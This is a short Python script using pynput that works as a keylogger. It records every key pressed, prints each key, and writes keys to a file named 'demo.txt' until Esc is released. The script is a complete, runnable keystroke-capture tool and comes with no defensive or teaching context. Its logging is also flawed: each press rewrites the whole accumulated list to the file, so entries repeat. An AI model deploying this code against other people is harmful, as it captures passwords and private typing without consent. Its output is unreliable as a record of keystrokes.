from pynput.keyboard import Key, Listener

keystrokes = []

def on_press(key):
    keystrokes.append(key)
    write_keystrokes(keystrokes)
    print(key)

def write_keystrokes(key_list):
    with open("demo.txt", "a") as f:
        for key in key_list:
            new_key = str(key).replace("'", "")
            f.write(new_key)
            f.write(" ")

def on_release(key):
    if key == Key.esc:
        return False

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()